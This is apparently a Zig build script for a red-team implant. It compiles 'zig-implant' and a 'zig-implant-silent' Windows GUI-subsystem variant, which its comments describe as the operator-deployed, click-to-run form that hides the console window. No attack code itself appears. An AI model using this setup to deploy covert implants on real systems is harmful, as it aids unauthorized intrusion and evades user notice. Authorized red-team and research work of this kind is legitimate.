const std = @import("std");

pub fn build(b: *std.Build) void {
    const target = b.standardTargetOptions(.{});
    const optimize = b.standardOptimizeOption(.{});

    // Console variant (dev — shows a cmd window).
    const console_mod = b.createModule(.{
        .root_source_file = b.path("src/main.zig"),
        .target = target,
        .optimize = optimize,
    });
    const exe_console = b.addExecutable(.{
        .name = "zig-implant",
        .root_module = console_mod,
    });
    b.installArtifact(exe_console);

    // Silent variant: GUI subsystem, no console window. Same source — only the
    // subsystem differs. This is the operator-deployed form (like
    // ruststrike-implant-silent): click-to-run without popping a cmd window.
    const silent_mod = b.createModule(.{
        .root_source_file = b.path("src/main.zig"),
        .target = target,
        .optimize = optimize,
    });
    const exe_silent = b.addExecutable(.{
        .name = "zig-implant-silent",
        .root_module = silent_mod,
    });
    exe_silent.subsystem = .windows;
    b.installArtifact(exe_silent);
}
